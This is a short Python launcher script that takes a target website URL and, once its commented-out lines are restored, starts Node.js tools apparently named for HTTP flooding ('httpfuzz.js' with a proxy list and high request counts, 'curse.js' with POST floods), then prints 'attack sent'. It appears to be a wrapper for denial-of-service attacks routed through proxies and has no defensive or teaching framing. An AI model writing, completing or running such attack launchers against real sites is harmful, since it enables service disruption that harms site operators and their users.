import sys
import subprocess

if len(sys.argv) < 2:
    print("Please provide the website URL as a command line argument.")
    sys.exit(1)

website = sys.argv[1]
print (website)
#subprocess.Popen(["node", "httpfuzz.js", website, "proxy.txt", "10000", "POST"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) #uncomment it when doing httpfuzz
#subprocess.Popen(["node", "curse.js", "POST" , website , "300", "1000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) #uncomment it when doing curse
print("attack sent")
